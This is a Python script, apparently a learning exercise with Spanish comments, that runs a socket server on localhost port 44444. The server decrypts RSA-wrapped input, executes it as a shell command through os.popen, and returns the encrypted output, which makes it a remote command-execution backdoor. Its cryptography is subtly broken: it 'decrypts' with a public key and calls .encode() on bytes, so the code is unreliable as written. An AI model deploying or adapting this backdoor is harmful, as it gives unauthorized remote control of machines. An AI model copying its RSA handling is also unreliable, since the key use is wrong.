#! /usr/bin/python3
# coding=utf-8

import socket
import os
import base64
from base64 import b64decode

from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

def decode_base64(received_base64_message):
    """
    Function to decode a message in Base64 
    """
    base64_bytes = received_base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes) 
    decoded_plaintext_message = message_bytes.decode('ascii')
    return decoded_plaintext_message

def decifrado(command_cifrado_priv, llave_publica):
    """
    Decifrar el comando
    param: command_cifrado_priv String to be decrypted
    param: llave_publica public key
    return decrypted string
    """

    #key = open(private_key_loc, "rb").read() 
    rsakey = RSA.importKey(llave_publica) 
    rsakey = PKCS1_OAEP.new(rsakey)
    decrypted = rsakey.decrypt(b64decode(command_cifrado_priv)) 
    #decrypted = rsakey.decrypt(command_cifrado_priv) 
    return decrypted
    

def cifrado(salida_comando, llave_publica):
    '''
    Cifrar el comando
    param: salida_comando String to be encrypted
    param: llave_publica public key
    return base64 encoded encrypted string
    '''
    
    rsakey = RSA.importKey(llave_publica)
    rsakey = PKCS1_OAEP.new(rsakey)
    comando_bytes = salida_comando.encode("utf-8") #comando debe estar en bytes
    encrypted = rsakey.encrypt(comando_bytes)
    print ("encrypted :")
    return encrypted

HOST = "127.0.0.1"
PORT = 44444

#leer llave
llave_publica = open("id_rsa.pub", "r").read()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as new_socket:
    new_socket.bind((HOST, PORT)) 
    new_socket.listen()
    
    while True:
        connection, address = new_socket.accept()
        with connection:
            print(f"Connected by {address}")
            data = connection.recv(10240)
            #if data.decode() != "":
            #if decifrado(data,llave_publica) != "": #descifrar con llave publica
            print(f"Received data: {data}")
            data_decode = decifrado(data,llave_publica)#descifrar con llave publica
            cmd_output = os.popen(data_decode).read()
            cmd_output_bytes = cmd_output.encode("utf-8")
            #base64_bytes = base64.b64encode(cmd_output_bytes)
            cifrado_bytes = cifrado(cmd_output_bytes,llave_publica) #cifrar con llave publica
            connection.sendall(cifrado_bytes)
            #elif not data:
             #   break
